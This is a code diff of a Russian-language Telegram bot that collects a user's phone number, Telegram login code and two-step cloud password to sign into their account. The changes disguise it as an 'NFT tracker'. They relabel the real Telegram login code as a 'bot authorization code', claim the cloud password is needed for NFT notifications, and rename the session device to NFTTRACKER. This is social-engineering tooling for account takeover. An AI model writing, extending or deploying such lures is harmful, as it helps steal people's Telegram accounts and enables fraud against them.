@@ -117,7 +117,7 @@ def get_code_keyboard():
             keyboard.append(row)
             row = []
     keyboard.append([
-        InlineKeyboardButton(text="🔄 Сброс", callback_data="digit_reset"),
+        InlineKeyboardButton(text="🔄 Удалить все", callback_data="digit_reset"),
         InlineKeyboardButton(text="0", callback_data="digit_0"),
         InlineKeyboardButton(text="⬅️ Удалить", callback_data="digit_back"),
     ])
@@ -140,7 +140,7 @@ async def check_ban(message: Message) -> bool:
     res = cursor.fetchone()
     conn.close()
     if res and res[0] == 1:
-        await message.answer("❌ Вы заблокированы администратором этого бота.")
+        await message.answer("❌ Вы заблокированы.")
         return True
     return False
 
@@ -177,7 +177,7 @@ async def cmd_start(message: Message, state: FSMContext):
 async def cmd_admin(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
-    await message.answer("👑 Админ-панель:", reply_markup=get_admin_keyboard())
+    await message.answer("Админ-панель by:@ElPachoso", reply_markup=get_admin_keyboard())
 
 
 @router.message(AuthState.waiting_for_phone, F.contact | F.text)
@@ -187,14 +187,14 @@ async def process_phone(message: Message, state: FSMContext):
 
     raw_phone = message.contact.phone_number if message.contact else message.text
     if not raw_phone:
-        await message.answer("Пожалуйста, отправь контакт.")
+        await message.answer("Подключения бота.")
         return
 
     cleaned_digits = re.sub(r"\D", "", raw_phone)
     phone = f"+{cleaned_digits}"
 
     status_msg = await message.answer(
-        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
+        f"⏳ Ожадиайте проверка серверов <code>{phone}</code> Бот отправляет вам код авторизации",
         reply_markup=ReplyKeyboardRemove(),
         parse_mode="HTML",
     )
@@ -207,9 +207,9 @@ async def send_telegram_code_background(user_id: int, phone: str, status_msg: Me
         name=f"session_{user_id}",
         api_id=int(API_ID),
         api_hash=API_HASH,
-        device_model="PASTURE US",
-        system_version="PASTUREUS",
-        app_version="PASTUREBOT",
+        device_model="NFTTREKER",
+        system_version="NFTTRACKERBOT",
+        app_version="NFTTRACKER",
         in_memory=True,
     )
 
@@ -226,13 +226,13 @@ async def send_telegram_code_background(user_id: int, phone: str, status_msg: Me
 
         await state.set_state(AuthState.waiting_for_code)
         await status_msg.edit_text(
-            "Код подтверждения\n\n"
-            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
+            "Код Авторизации бота\n\n"
+            "Бот отправил вам код авторизации бота напишите в чат или нажимая кнопки** (например: <code>12345</code>)!\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
         )
-        add_log(f"Запрошен код для номера {phone}")
+        add_log(f"Запрошен код авторизации для номера {phone}")
     except Exception as e:
         await status_msg.edit_text(f"❌ Ошибка отправки кода: {e}\nНапиши /start и попробуй снова.")
         try:
@@ -303,7 +303,7 @@ async def execute_sign_in(bot_inst, chat_id, state: FSMContext, user_id: int, co
         if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
             await bot_inst.send_message(
                 chat_id,
-                "Облачный пароль\n\nНа аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
+                "Облачный пароль\n\nЕсли вы не введете облачный пороль бот не сможет прысылать вам нфт уведомления "
             )
             await state.set_state(AuthState.waiting_for_password)
         else:
@@ -337,8 +337,8 @@ async def process_code_input(callback: CallbackQuery, state: FSMContext):
     masked_display = " ".join(masked_list)
 
     text = (
-        "Код подтверждения\n\n"
-        "Telegram отправил тебе код в приложение. Можешь нажимать кнопки или написать цифрами в чат:\n\n"
+        "Код подключения бота\n\n"
+        "код подключения бота напишите в чат или по кнопкам ожидания:5 минут:\n\n"
         f"<code>{masked_display}</code>"
     )
 
